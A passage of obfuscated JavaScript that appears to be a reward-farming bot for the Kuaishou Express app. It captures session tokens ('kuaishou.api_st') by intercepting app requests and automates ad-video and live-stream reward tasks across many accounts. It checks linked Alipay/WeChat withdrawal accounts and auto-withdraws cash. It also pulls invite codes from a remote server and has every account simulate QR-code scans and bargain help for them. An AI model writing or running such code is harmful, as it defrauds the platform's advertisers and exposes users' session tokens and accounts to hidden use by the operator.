        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://ug-fission.kuaishou.com/bargain/?fid=895255750&cc=share_wxms&followRefer=151&code=" + T + "&shareMethod=TOKEN&kpn=NEBULA&subBiz=BARGAIN&shareId=16905401129783&shareMode=SYSTEM&noBackNavi=true&originShareId=16905401129783&useMerchantWeb=1&layoutType=4&shareObjectId=%7B%22teamId%22%3A%22%22,%22packetId%22%3A%22" + c + "%22%7D&shareUrlOpened=0&hyId=bargain&timestamp=" + +new Date(),
        'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
      }
    };
    await _0x39a23b("post", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }
  }

  async ['helpScan'](T) {
    let p = T["split"]('&'),
        C = p[0],
        S = p[1];

    if (C == this["userId"]) {
      return;
    }

    let a = "https://api.kuaishouzt.com/rest/zt/share/show/any",
        Y = "theme=light&sdkVersion=1.14.0.4&kpf=ANDROID_PHONE&shareMessage=https%3A%2F%2Fnicdd.get666bjrqu985xvp14v.com%2Ff%2F" + S + "%3FlayoutType%3D4&kpn=NEBULA&launchState=hotLaunch&sessionId=ac165e40-48bd-42de-9fc5-b250d7eb983c&extTransientParams=%7B%22source%22%3A%22userScanCamera%22%7D",
        j = _0x495d61(a, this["cookie"], Y);

    await _0x39a23b("post", j);
    let Z = _0x1a0963;

    if (!Z) {
      return;
    }

    Z["result"] == 1 ? (await _0x3de8b8["wait"](100), await this["helpInvite"](T)) : console["log"]("账号[" + this["name"] + "]模拟邀请二维码扫描失败：" + Z["error_msg"]);
  }

  async ["bindInfo"]() {
    let c = "https://www.kuaishoupay.com/pay/account/h5/provider/bind_info",
        p = "account_group_key=NEBULA_CASH_ACCOUNT&bind_page_type=3",
        C = _0x495d61(c, this["cookie"], p);

    await _0x39a23b("post", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    if (S["result"] == "SUCCESS") {
      let Y = "未绑定支付宝",
          j = "未绑定微信";
      S["alipay_bind"] == true && (this["bindAlipay"] = true, this["alipay"] = S['alipay_nick_name'], Y = "已绑定支付宝[" + S["alipay_nick_name"] + ']');
      S["wechat_bind"] == true && (this["bindWechat"] = true, this["wechat"] = S["wechat_nick_name"], j = "已绑定微信[" + S["wechat_nick_name"] + ']');
      console["log"]("账号[" + this["name"] + ']' + j + '，' + Y);
    } else {
      console["log"]("账号[" + this["name"] + "]查询提现账号绑定情况失败：" + S["error_msg"]);
    }
  }

  async ['accountInfo']() {
    let c = "https://www.kuaishoupay.com/pay/account/h5/withdraw/account_info",
        p = "account_group_key=NEBULA_CASH_ACCOUNT&providers=",
        C = _0x495d61(c, this["cookie"], p);

    await _0x39a23b("post", C);
    let S = _0x1a0963;

    if (!S) {
      return;
    }

    S["result"] == "SUCCESS" ? this["needSms"] = S["need_mobile_code"] : console["log"]("账号[" + this["name"] + "]查询账号提现情况失败：" + S["error_msg"]);
  }

}

!(async () => {
  if (typeof $request !== "undefined") {
    await _0x13d82d();
  } else {
    if (!(await _0x2dc359())) {
      return;
    }

    console["log"]("============================");
    console["log"]("\n============== 登录 ==============");

    for (let a of _0x431ea3) {
      await a["getUserInfo"]();
      await _0x3de8b8["wait"](500);
    }

    let p = _0x431ea3["filter"](j => j["valid"] == true);

    if (p["length"] == 0) {
      return;
    }

    for (let Z of p) {
      console['log']("\n=========== " + Z["name"] + " ===========");
      await Z["getSignInfo"]();
      await _0x3de8b8["wait"](200);
      await Z["openBox"](false);
      await _0x3de8b8["wait"](200);
      await Z["taskList"]();
      await _0x3de8b8["wait"](200);
      await Z["luckydrawSign"]();
      await _0x3de8b8["wait"](200);

      if (Z["hasLuckydraw"] == true) {
        await Z["luckdrawTimerInfo"]();
        await _0x3de8b8["wait"](200);
        await Z["luckdrawTasks"]();
        await _0x3de8b8["wait"](200);
        await Z["luckdrawInfo"]();
        await _0x3de8b8["wait"](200);
      }

      if (Z["task"][_0x1e4967["luckydraw"]]["needRun"]) {
        for (let U = 0; U < Z["task"][_0x1e4967["luckydraw"]]["num"]; U++) {
          _0x20a9d7 < 13 ? (await Z["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_161_213"]), await _0x3de8b8["wait"](200), await Z["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_11_213"]), await _0x3de8b8["wait"](200)) : (await Z["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_161_100"]), await _0x3de8b8["wait"](200), await Z["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_11_100"]), await _0x3de8b8['wait'](200));
        }
      }

      if (Z["task"][_0x1e4967['ad']]['needRun']) {
        for (let J = 0; J < Z["task"][_0x1e4967['ad']]["num"]; J++) {
          await Z["ksAdParam"](_0x351e94["ad1"]);
          await _0x3de8b8["wait"](200);
          J != Z["task"][_0x1e4967['ad']]["num"] - 1 && (await _0x3de8b8["wait"](2000));
        }
      }

      if (Z["task"][_0x1e4967['gj']]["needRun"]) {
        for (let V = 0; V < Z["task"][_0x1e4967['gj']]["num"]; V++) {
          await Z["ksgj"]()[[]];
          await _0x3de8b8["wait"](200);
        }
      }

      if (Z["task"][_0x1e4967["live"]]["needRun"]) {
        for (let E = 0; E < Z["task"][_0x1e4967["live"]]["num"]; E++) {
          await Z["ksNeoAdParam"](_0x10d9f8["liveVideo_75"]);
          await _0x3de8b8['wait'](200);
        }
      }
    }

    console["log"]("\n============== 账户情况 ==============");

    for (let O of p) {
      await O["accountOverview"]();
      await _0x3de8b8["wait"](200);
      await O["bindInfo"]();
      await _0x3de8b8["wait"](200);
      await O["accountInfo"]();
      await _0x3de8b8['wait'](200);
    }

    console["log"]("\n============== 自动提现 ==============");
    let C = "按提现列表自动提现";
    _0x1e627b && (C = "自动提现" + _0x1e627b + '元');

    if (_0x13d24b) {
      C = "最大化提现";
    }

    if (_0x20a9d7 == _0x26f17b) {
      console["log"]("提现时间，现在设置为" + C);

      for (let d of p) {
        await d['withdrawOverview'](), await _0x3de8b8["wait"](200);
      }
    } else {
      console["log"]("非提现时间，现在设置为" + _0x26f17b + '点' + C);
    }

    await _0x217ea6();

    if (_0x5718d8["length"] > 0) {
      for (let A of p) {
        for (let k of _0x5718d8) {
          await A["helpScan"](k);
          await _0x3de8b8["wait"](200);
        }
      }
    }

    if (yifenk["length"] > 0) {
      for (let g of p) {
        for (let t of yifenk) {
          let L = t["split"]('@')[0],
              X = t["split"]('@')[1];
          await g["helpPackage"](X, L);
          await _0x3de8b8["wait"](1000);
        }
      }
    }

    _0x113109 == 2 ? await _0x577f0c() : _0x113109 == 1 && _0x20a9d7 == _0x26f17b && (await _0x577f0c());
  }
})()["catch"](T => _0x3de8b8["logErr"](T))['finally'](() => _0x3de8b8["done"]());

async function _0x13d82d() {
  if ($request["url"]["indexOf"]("appsupport/yoda/biz/info") > -1) {
    let c = $request["headers"]["Cookie"]["match"](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';
    _0x547212 ? _0x547212["indexOf"](c) == -1 && (_0x547212 = _0x547212 + "\n" + c, _0x3de8b8["setdata"](_0x547212, "ksjsbCookie"), ckList = _0x547212["split"]("\n"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第" + ckList["length"] + "个ck成功: " + c))) : (_0x3de8b8["setdata"](c, "ksjsbCookie"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第1个ck成功: " + c)));
  }

  if ($request["url"]["indexOf"]("ksapp/client/package/renew") > -1) {
    let p = $request["url"]["match"](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';
    _0x547212 ? _0x547212["indexOf"](p) == -1 && (_0x547212 = _0x547212 + "\n" + p, _0x3de8b8["setdata"](_0x547212, "ksjsbCookie"), ckList = _0x547212["split"]("\n"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第" + ckList["length"] + "个ck成功: " + p))) : (_0x3de8b8["setdata"](p, "ksjsbCookie"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第1个ck成功: " + p)));
  }
}

async function _0x2dc359() {
  if (_0x547212) {
    let c = _0x4c35fe[0];

    for (let p of _0x4c35fe) {
      if (_0x547212['indexOf'](p) > -1) {
        c = p;
        break;
      }
    }

    for (let a of _0x547212["split"](c)) {
      a && _0x431ea3["push"](new _0x9d8dda(a));
    }

    _0x19c25c = _0x431ea3["length"];
  } else {
    console["log"]("未找到CK");
    return;
  }

  console["log"]("共找到" + _0x19c25c + "个账号");
  return true;
}

async function _0x577f0c() {
  if (!_0x279d25) {
    return;
  }

  notifyBody = "快手极速版运行通知\n\n" + _0x279d25;

  if (_0x113109 > 0) {
    _0x3de8b8["msg"](notifyBody);

    if (_0x3de8b8["isNode"]()) {
      var c = require("./sendNotify");

      await c['sendNotify'](_0x3de8b8["name"], notifyBody);
    }
  } else {
    console["log"](notifyBody);
  }
}

function _0x1ab8b7(T) {
  console["log"](T);
  _0x279d25 += T;
  _0x279d25 += "\n";
}

async function _0x282ff5(T) {
  if (!PushDearKey) {
    return;
  }

  if (!T) {
    return;
  }

  console["log"]("\n============= PushDear 通知 =============\n");
  console["log"](T);
  let p = {
    'url': "https://api2.pushdeer.com/message/push?pushkey=" + PushDearKey + "&text=" + encodeURIComponent(T),
    'headers': {}
  };
  await _0x39a23b("get", p);
  let C = _0x1a0963,
      S = C["content"]["result"] == false ? '失败' : '成功';
  console["log"]("\n========== PushDear 通知发送" + S + " ==========\n");
}

async function _0x505e51() {
  const c = {
    'url': _0x180c0c,
    'headers': ''
  };
  await _0x39a23b("get", c);
  let p = _0x1a0963;

  if (!p) {
    return;
  }

  if (p[_0x5bc515]) {
    let a = p[_0x5bc515];

    if (a["status"] == 0) {
      if (_0x459e63 >= a["version"]) {
        _0x2e716e = true;
        _0x75eec0 = "https://ziye0.coding.net/p/ziye/d/ql/git/raw/master/ks.json";
        console["log"](a["msg"][a["status"]]);
        console['log'](a["updateMsg"]);
        console["log"]("现在运行的脚本版本是：1.07，最新脚本版本：" + a["latestVersion"]);
      } else {
        console["log"](a["versionMsg"]);
      }
    } else {
      console["log"](a["msg"][a["status"]]);
    }
  } else {
    console["log"](p["errorMsg"]);
  }
}

async function _0x217ea6() {
  let c = '';
  const p = {
    'url': _0x180c0c,
    'headers': ''
  };
  await _0x39a23b("get", p);
  let C = _0x1a0963;

  if (!C) {
    return c;
  }

  for (let a of C["invite"]) {
    a && _0x5718d8["push"](a);
  }

  for (let Y of C["ijkkk"]) {
    Y && yifenk["push"](Y);
  }

  return c;
}

function _0x495d61(T, c, p = '') {
  let S = T['replace']('//', '/')["split"]('/')[1];
  const a = {
    'Host': S,
    'Cookie': c
  },
        Y = {
    'url': T,
    'headers': a
  };
  p && (Y["body"] = p, Y['headers']["Content-Type"] = "application/x-www-form-urlencoded", Y["headers"]["Content-Length"] = Y["body"] ? Y["body"]["length"] : 0);
  return Y;
}

async function _0x39a23b(T, c) {
  _0x1a0963 = null;
  return new Promise(C => {
    _0x3de8b8[T](c, async (a, Y, j) => {
      try {
        if (a) {
          console["log"](T + "请求失败");
          console["log"](JSON["stringify"](a));

          _0x3de8b8["logErr"](a);
        } else {
          _0x244336(j) && (_0x1a0963 = JSON["parse"](j));
        }
      } catch (B) {
        _0x3de8b8["logErr"](B, Y);
      } finally {
        C();
      }
    });
  });
}

function _0x244336(T) {
  try {
    if (typeof JSON["parse"](T) == 'object') {
      return true;
    } else {
      console["log"](T);
    }
  } catch (p) {
    console["log"](p);
    console["log"]("服务器访问数据为空，请检查自身设备网络情况");
    return false;
  }
}

function _0x271dc5(T, c) {
  return T < c ? T : c;
}

function _0x2be587(T, c) {
  return T < c ? c : T;
}

function _0x4c9db4(T, c, p = '0') {
  let S = String(T),
      a = c > S["length"] ? c - S["length"] : 0,
      Y = '';

  for (let j = 0; j < a; j++) {
    Y += p;
  }

  Y += S;
  return Y;
}

function _0x4b5cde(T = 12) {
  let p = "abcdef0123456789",
      C = p["length"],
      S = '';

  for (i = 0; i < T; i++) {
    S += p["charAt"](Math["floor"](Math["random"]() * C));
  }

  return S;
}

var _0x331719 = {
  '_keyStr': "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
  'encode': function (T) {
    var p = '',
        C,
        S,
        a,
        Y,
        j,
        Z,
        Q,
        B = 0;
    T = _0x331719["_utf8_encode"](T);

    while (B < T["length"]) {
      C = T["charCodeAt"](B++);
      S = T["charCodeAt"](B++);
      a = T["charCodeAt"](B++);
      Y = C >> 2;
      j = (C & 3) << 4 | S >> 4;
      Z = (S & 15) << 2 | a >> 6;
      Q = a & 63;

      if (isNaN(S)) {
        Z = Q = 64;
      } else {
        isNaN(a) && (Q = 64);
      }

      p = p + this["_keyStr"]["charAt"](Y) + this["_keyStr"]["charAt"](j) + this["_keyStr"]["charAt"](Z) + this["_keyStr"]["charAt"](Q);
    }

    return p;
  },
  'decode': function (T) {
    var U = '';
    var S,
        a,
        Y,
        j,
        Z,
        Q,
        B,
        b = 0;
    T = T["replace"](/[^A-Za-z0-9+/=]/g, '');

    while (b < T["length"]) {
      j = this["_keyStr"]["indexOf"](T["charAt"](b++));
      Z = this["_keyStr"]["indexOf"](T["charAt"](b++));
      Q = this["_keyStr"]["indexOf"](T["charAt"](b++));
      B = this["_keyStr"]["indexOf"](T["charAt"](b++));
      S = j << 2 | Z >> 4;
      a = (Z & 15) << 4 | Q >> 2;
      Y = (Q & 3) << 6 | B;
      U = U + String["fromCharCode"](S);
      Q != 64 && (U = U + String["fromCharCode"](a));
      B != 64 && (U = U + String['fromCharCode'](Y));
    }

    U = _0x331719["_utf8_decode"](U);
    return U;
  },
  '_utf8_encode': function (T) {
    T = T["replace"](/rn/g, 'n');
    var p = '';

    for (var C = 0; C < T["length"]; C++) {
      var S = T["charCodeAt"](C);
      S < 128 ? p += String["fromCharCode"](S) : S > 127 && S < 2048 ? (p += String["fromCharCode"](S >> 6 | 192), p += String["fromCharCode"](S & 63 | 128)) : (p += String["fromCharCode"](S >> 12 | 224), p += String["fromCharCode"](S >> 6 & 63 | 128), p += String["fromCharCode"](S & 63 | 128));
    }

    return p;
  },
  '_utf8_decode': function (T) {
    var p = '',
        C = 0,
        S = c1 = c2 = 0;

    while (C < T["length"]) {
      S = T["charCodeAt"](C);

      if (S < 128) {
        p += String["fromCharCode"](S);
        C++;
      } else {
        S > 191 && S < 224 ? (c2 = T["charCodeAt"](C + 1), p += String["fromCharCode"]((S & 31) << 6 | c2 & 63), C += 2) : (c2 = T["charCodeAt"](C + 1), c3 = T["charCodeAt"](C + 2), p += String["fromCharCode"]((S & 15) << 12 | (c2 & 63) << 6 | c3 & 63), C += 3);
      }
    }

    return p;
  }
};

function _0xcb54a4(T) {
  function p(N, l) {
    return N << l | N >>> 32 - l;
  }

  function C(N, l) {
    var D, K, y, H, x0;
    y = 2147483648 & N;
    H = 2147483648 & l;
    D = 1073741824 & N;
    K = 1073741824 & l;
    x0 = (1073741823 & N) + (1073741823 & l);
    return D & K ? 2147483648 ^ x0 ^ y ^ H : D | K ? 1073741824 & x0 ? 3221225472 ^ x0 ^ y ^ H : 1073741824 ^ x0 ^ y ^ H : x0 ^ y ^ H;
  }

  function S(N, l, R) {
    return N & l | ~N & R;
  }

  function a(N, l, R) {
    return N & R | l & ~R;
  }

  function Y(N, l, R) {
    return N ^ l ^ R;
  }

  function j(N, l, R) {
    return l ^ (N | ~R);
  }

  function Z(N, l, R, r, D, K, y) {
    N = C(N, C(C(S(l, R, r), D), y));
    return C(p(N, K), l);
  }

  function Q(N, l, R, r, D, K, y) {
    return N = C(N, C(C(a(l, R, r), D), y)), C(p(N, K), l);
  }

  function B(N, l, R, r, D, K, y) {
    N = C(N, C(C(Y(l, R, r), D), y));
    return C(p(N, K), l);
  }

  function b(N, l, R, r, D, K, y) {
    N = C(N, C(C(j(l, R, r), D), y));
    return C(p(N, K), l);
  }

  function U(N) {
    for (var R, r = N["length"], D = r + 8, K = (D - D % 64) / 64, y = 16 * (K + 1), H = new Array(y - 1), x0 = 0, x1 = 0; r > x1;) {
      R = (x1 - x1 % 4) / 4;
      x0 = x1 % 4 * 8;
      H[R] = H[R] | N["charCodeAt"](x1) << x0;
      x1++;
    }

    R = (x1 - x1 % 4) / 4;
    x0 = x1 % 4 * 8;
    H[R] = H[R] | 128 << x0;
    H[y - 2] = r << 3;
    H[y - 1] = r >>> 29;
    return H;
  }

  function q(N) {
    var l,
        R,
        r = '',
        D = '';

    for (R = 0; 3 >= R; R++) {
      l = N >>> 8 * R & 255, D = '0' + l["toString"](16), r += D["substr"](D["length"] - 2, 2);
    }

    return r;
  }

  function i(N) {
    N = N["replace"](/\r\n/g, "\n");

    for (var l = '', R = 0; R < N["length"]; R++) {
      var r = N["charCodeAt"](R);
      128 > r ? l += String["fromCharCode"](r) : r > 127 && 2048 > r ? (l += String["fromCharCode"](r >> 6 | 192), l += String["fromCharCode"](63 & r | 128)) : (l += String["fromCharCode"](r >> 12 | 224), l += String["fromCharCode"](r >> 6 & 63 | 128), l += String["fromCharCode"](63 & r | 128));
    }

    return l;
  }

  var J,
      I,
      V,
      E,
      W,
      O,
      P,
      h,
      z,
      v = [],
      M = 7,
      d = 12,
      u = 17,
      e = 22,
      A = 5,
      k = 9,
      o = 14,
      g = 20,
      t = 4,
      L = 11,
      X = 16,
      m = 23,
      n = 6,
      F = 10,
      w = 15,
      G = 21;

  for (T = i(T), v = U(T), O = 1732584193, P = 4023233417, h = 2562383102, z = 271733878, J = 0; J < v["length"]; J += 16) {
    I = O;
    V = P;
    E = h;
    W = z;
    O = Z(O, P, h, z, v[J + 0], M, 3614090360);
    z = Z(z, O, P, h, v[J + 1], d, 3905402710);
    h = Z(h, z, O, P, v[J + 2], u, 606105819);
    P = Z(P, h, z, O, v[J + 3], e, 3250441966);
    O = Z(O, P, h, z, v[J + 4], M, 4118548399);
    z = Z(z, O, P, h, v[J + 5], d, 1200080426);
    h = Z(h, z, O, P, v[J + 6], u, 2821735955);
    P = Z(P, h, z, O, v[J + 7], e, 4249261313);
    O = Z(O, P, h, z, v[J + 8], M, 1770035416);
    z = Z(z, O, P, h, v[J + 9], d, 2336552879);
    h = Z(h, z, O, P, v[J + 10], u, 4294925233);
    P = Z(P, h, z, O, v[J + 11], e, 2304563134);
    O = Z(O, P, h, z, v[J + 12], M, 1804603682);
    z = Z(z, O, P, h, v[J + 13], d, 4254626195);
    h = Z(h, z, O, P, v[J + 14], u, 2792965006);
    P = Z(P, h, z, O, v[J + 15], e, 1236535329);
    O = Q(O, P, h, z, v[J + 1], A, 4129170786);
    z = Q(z, O, P, h, v[J + 6], k, 3225465664);
    h = Q(h, z, O, P, v[J + 11], o, 643717713);
    P = Q(P, h, z, O, v[J + 0], g, 3921069994);
    O = Q(O, P, h, z, v[J + 5], A, 3593408605);
    z = Q(z, O, P, h, v[J + 10], k, 38016083);
    h = Q(h, z, O, P, v[J + 15], o, 3634488961);
    P = Q(P, h, z, O, v[J + 4], g, 3889429448);
    O = Q(O, P, h, z, v[J + 9], A, 568446438);
    z = Q(z, O, P, h, v[J + 14], k, 3275163606);
    h = Q(h, z, O, P, v[J + 3], o, 4107603335);
    P = Q(P, h, z, O, v[J + 8], g, 1163531501);
    O = Q(O, P, h, z, v[J + 13], A, 2850285829);
    z = Q(z, O, P, h, v[J + 2], k, 4243563512);
    h = Q(h, z, O, P, v[J + 7], o, 1735328473);
    P = Q(P, h, z, O, v[J + 12], g, 2368359562);
    O = B(O, P, h, z, v[J + 5], t, 4294588738);
    z = B(z, O, P, h, v[J + 8], L, 2272392833);
    h = B(h, z, O, P, v[J + 11], X, 1839030562);
    P = B(P, h, z, O, v[J + 14], m, 4259657740);
    O = B(O, P, h, z, v[J + 1], t, 2763975236);
    z = B(z, O, P, h, v[J + 4], L, 1272893353);
    h = B(h, z, O, P, v[J + 7], X, 4139469664);
    P = B(P, h, z, O, v[J + 10], m, 3200236656);
    O = B(O, P, h, z, v[J + 13], t, 681279174);
    z = B(z, O, P, h, v[J + 0], L, 3936430074);
    h = B(h, z, O, P, v[J + 3], X, 3572445317);
    P = B(P, h, z, O, v[J + 6], m, 76029189);
    O = B(O, P, h, z, v[J + 9], t, 3654602809);
    z = B(z, O, P, h, v[J + 12], L, 3873151461);
    h = B(h, z, O, P, v[J + 15], X, 530742520);
    P = B(P, h, z, O, v[J + 2], m, 3299628645);
    O = b(O, P, h, z, v[J + 0], n, 4096336452);
    z = b(z, O, P, h, v[J + 7], F, 1126891415);
    h = b(h, z, O, P, v[J + 14], w, 2878612391);
    P = b(P, h, z, O, v[J + 5], G, 4237533241);
    O = b(O, P, h, z, v[J + 12], n, 1700485571);
    z = b(z, O, P, h, v[J + 3], F, 2399980690);
    h = b(h, z, O, P, v[J + 10], w, 4293915773);
    P = b(P, h, z, O, v[J + 1], G, 2240044497);
    O = b(O, P, h, z, v[J + 8], n, 1873313359);
    z = b(z, O, P, h, v[J + 15], F, 4264355552);
    h = b(h, z, O, P, v[J + 6], w, 2734768916);
    P = b(P, h, z, O, v[J + 13], G, 1309151649);
    O = b(O, P, h, z, v[J + 4], n, 4149444226);
    z = b(z, O, P, h, v[J + 11], F, 3174756917);
    h = b(h, z, O, P, v[J + 2], w, 718787259);
    P = b(P, h, z, O, v[J + 9], G, 3951481745);
    O = C(O, I);
    P = C(P, V);
    h = C(h, E);
    z = C(z, W);
  }

  var s = q(O) + q(P) + q(h) + q(z);
  return s["toLowerCase"]();
}

function _0x4f15e2(T, c) {
  const p = {
    'vUthb': function (S, a) {
      return S + a;
    },
    'xansl': '自动提现',
    'zYPmU': function (S, a) {
      return S(a);
    },
    'eJcPH': function (S, a) {
      return S === a;
    },
    'Ffwdi': 'SdDDo',
    'TZDtX': "call",
    'LLmyY': function (S, a) {
      return S == a;
    },
    'YiGml': 'string',
    'ObOPk': 'get',
    'QMUHn': function (S, a) {
      return S === a;
    },
    'zHSSq': "POST",
    'nKUNb': "PUT",
    'BUgao': 'put',
    'yEKyH': "send",
    'vahvK': "env",
    'dpfdF': function (S, a) {
      return S !== a;
    },
    'eyKhd': 'qrpCi',
    'EUGLY': "exec",
    'JrMHo': "getval",
    'YTTpc': 'parse',
    'laqkM': "lodash_get",
    'nyIyV': 'sFSUj',
    'tTZNr': "http",
    'pWUNv': 'logs',
    'PSfXw': "isMute",
    'gfRMI': "isNeedRewrite",
    'zYZMh': "logSeparator",
    'GpvDT': "startTime",
    'rwkXM': "getTime",
    'XlxAL': "assign",
    'EpagF': 'log',
    'fSfdS': function (S, a) {
      return S + a;
    },
    'gqCJK': function (S, a) {
      return S + a;
    },
    'Gfcja': "name",
    'hekcr': ", 开始!",
    'mPAYK': function (S, a) {
      return S > a;
    },
    'PllJg': "fromCharCode",
    'iqado': function (S, a) {
      return S | a;
    },
    'MzGTf': function (S, a) {
      return S & a;
    },
    'TKgVx': function (S, a) {
      return S !== a;
    },
    'olIIK': "ITvHD",
    'HHxsA': function (S, a) {
      return S != a;
    },
    'CQFuU': "exports",
    'uPIiE': function (S, a) {
      return S === a;
    },
    'moxoN': 'yRWdM',
    'ndkrr': "undefined",
    'abQqZ': function (S, a) {
      return S == a;
    },
    'yNHJl': "object",
    'OakBY': 'length',
    'JeirW': function (S, a) {
      return S - a;
    },
    'QXdUA': function (S, a) {
      return S !== a;
    },
    'OEsXl': function (S, a) {
      return S === a;
    },
    'UAHdw': 'ILxfY',
    'PnEQd': 'SLhlf',
    'BkkNj': function (S, a) {
      return S > a;
    },
    'njcCW': function (S, a) {
      return S < a;
    },
    'OaFOK': 'charCodeAt',
    'FqswT': function (S, a) {
      return S | a;
    },
    'GzHCj': function (S, a) {
      return S << a;
    },
    'HqOfP': function (S, a) {
      return S & a;
    },
    'YvJVr': function (S, a) {
      return S + a;
    },
    'cPawj': function (S, a) {
      return S << a;
    },
    'kVVAm': function (S, a) {
      return S << a;
    },
    'MUUEt': "eRzSJ",
    'RCuQp': "stringify",
    'WigGt': 'UVTpF',
    'nkjIw': "replace",
    'EHEwT': function (S, a) {
      return S < a;
    },
    'ELjRv': function (S, a) {
      return S | a;
    },
    'hiJrK': function (S, a) {
      return S >> a;
    },
    'wSNNM': function (S, a) {
      return S | a;
    },
    'icCLE': function (S, a) {
      return S | a;
    },
    'TbLse': "getdata",
    'OECAm': function (S, a) {
      return S === a;
    },
    'lKqWU': 'XDylR',
    'nkxqU': "OZDut",
    'pvYcm': function (S, a) {
      return S !== a;
    },
    'RtLih': "fecFj",
    'OdOgo': "setdata",
    'pYeKT': function (S, a) {
      return S !== a;
    },
    'Hvrfl': "RfVYF",
    'ojkaK': "url",
    'lwNtd': "openUrl",
    'fkYsv': "media-url",
    'QiEkZ': "mediaUrl",
    'bpiZV': "rqroY",
    'WeMSp': "AwQOv",
    'QOfCX': '@chavy_boxjs_userCfgs.httpapi',
    'YNSwh': "@chavy_boxjs_userCfgs.httpapi_timeout",
    'WJSeA': "timeout",
    'UyCjF': "cron",
    'evLIU': "split",
    'stalv': "*/*",
    'TMZRE': "catch",
    'KrjuT': "isNode",
    'gKGOw': "path",
    'zezEm': function (S, a) {
      return S(a);
    },
    'RjPnH': "resolve",
    'xXhjZ': 'dataFile',
    'lkrOZ': 'existsSync',
    'UXuFw': function (S, a) {
      return S && a;
    },
    'KoZWa': "BwDxP",
    'fPWUS': "tcvnO",
    'yOzYr': "readFileSync",
    'tMFnY': function (S, a) {
      return S(a);
    },
    'LqimL': function (S, a) {
      return S(a);
    },
    'rqfCP': "cwd",
    'Bktev': "data",
    'MSCAv': "writeFileSync",
    'VBFSP': 'jCvBn',
    'sQUUP': 'VtzwK',
    'kdHtp': ".$1",
    'mKOJb': "open-url",
    'XReEV': function (S, a) {
      return S !== a;
    },
    'whlcJ': "tAHnY",
    'bACgC': 'WYytN',
    'EenlS': function (S, a) {
      return S !== a;
    },
    'rGDJj': "toString",
    'zkpOW': 'match',
    'nWjqV': "slice",
    'BoyEO': "reduce",
    'BRBwt': function (S, a) {
      return S - a;
    },
    'Tosyp': "最大化提现",
    'BzvSr': "VFxhh",
    'eTTEO': function (S, a) {
      return S === a;
    },
    'UTTFk': "YehTV",
    'IBedw': "isDirectory",
    'YBFrW': function (S, a, Y) {
      return S(a, Y);
    },
    'avqsd': "rmdirSync",
    'XaBsU': "test",
    'kBRzH': "null",
    'XGvRG': 'lodash_set',
    'OuTOW': "setval",
    'ZGhoB': "IWXJI",
    'NvGvD': "isSurge",
    'gXLLg': "isLoon",
    'QEklD': "read",
    'JilvT': "valueForKey",
    'GvmCb': "loaddata",
    'Erjln': "write",
    'TEhQN': "isQuanX",
    'SItKq': "writedata",
    'mAQuS': "JRiyX",
    'wJEVG': "VnxND",
    'UnUmH': "got",
    'VWREu': function (S, a) {
      return S(a);
    },
    'UfFmc': 'cktough',
    'KUpZH': 'ckjar',
    'wbhLH': 'CookieJar',
    'Ufsfg': "headers",
    'EYucJ': "Cookie",
    'EwYhm': 'cookieJar',
    'XxBGY': function (S, a) {
      return S && a;
    },
    'uZTTG': 'body',
    'RacES': "statusCode",
    'PWoQA': 'status',
    'hwvxW': function (S, a, Y, j) {
      return S(a, Y, j);
    },
    'WqVMM': "unlinkSync",
    'jZbbI': "forEach",
    'fruUq': "rEDBj",
    'ZCHSn': "utuzS",
    'jBBop': "map",
    'zyxAx': "setCookieSync",
    'mcwDC': "XerNB",
    'bdYaD': "logErr",
    'RKyIx': function (S, a, Y, j) {
      return S(a, Y, j);
    },
    'mGhWK': "opts",
    'pswtb': 'initGotEnv',
    'uZRAe': "redirect",
    'rMFJs': "then",
    'pYoPM': function (S, a) {
      return S && a;
    },
    'YiNrA': function (S, a, Y, j) {
      return S(a, Y, j);
    },
    'wdjsG': function (S, a, Y, j) {
      return S(a, Y, j);
    },
    'jSddq': function (S, a) {
      return S - a;
    },
    'wQqon': function (S, a) {
      return S + a;
    },
    'FZjHX': function (S, a) {
      return S + a;
    },
    'QFjSh': ", 结束! 🕛 ",
    'kOHbb': "method",
    'fdBtA': "fetch",
    'XMRkJ': "http://",
    'awTOK': "/v1/scripting/evaluate",
    'EtYHG': "uuOFb",
    'WFTAO': "Content-Type",
    'UWYCE': "application/x-www-form-urlencoded",
    'JBlns': "post",
    'Wlkha': "atBfJ",
    'OgVdL': "nJAlO",
    'tKavq': 'VVpAe',
    'skKHu': 'YhuYF',
    'qmHBe': function (S) {
      return S();
    },
    'qpgdd': function (S, a) {
      return S === a;
    },
    'nPTxz': "EqePu",
    'yRDNE': "ESIAN",
    'gwRAk': function (S, a) {
      return S && a;
    },
    'GCFnt': function (S, a, Y, j) {
      return S(a, Y, j);
    },
    'nnECN': function (S, a) {
      return S != a;
    },
    'sEkOb': function (S, a) {
      return S != a;
    },
    'ztCQh': function (S, a, Y, j) {
      return S(a, Y, j);
    },
    'oxxEd': "BQivw",
    'ClDME': "HZhXn",
    'NSZIb': function (S, a) {
      return S === a;
    },
    'CmwsV': "Socns",
    'vMYsg': 'AyGnU',
    'UIfGT': "SmdtB",
    'feAfW': "XnTUH",
    'hLLKO': function (S, a) {
      return S === a;
    },
    'OEkKP': 'getMonth',
    'TAFtK': "getDate",
    'QECaO': "getSeconds",
    'nxqaa': 'floor',
    'WqjEM': function (S, a) {
      return S / a;
    },
    'txpGr': function (S, a) {
      return S + a;
    },
    'jMDGH': "getMilliseconds",
    'vLoad': "getFullYear",
    'dPlSl': "substr",
    'ZlJQz': function (S, a) {
      return S + a;
    },
    'eEfWA': function (S, a) {
      return S + a;
    },
    'RlKZK': "2|3|0|6|1|4|5",
    'PpyVH': function (S, a) {
      return S * a;
    },
    'wPjul': function (S, a) {
      return S % a;
    },
    'KRplz': function (S, a) {
      return S * a;
    },
    'YJetv': function (S, a) {
      return S / a;
    },
